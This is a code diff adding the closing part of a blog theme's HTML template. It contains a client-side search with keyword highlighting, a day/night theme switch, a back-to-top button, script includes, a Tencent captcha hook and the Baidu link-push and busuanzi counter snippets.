+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura-reduce.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
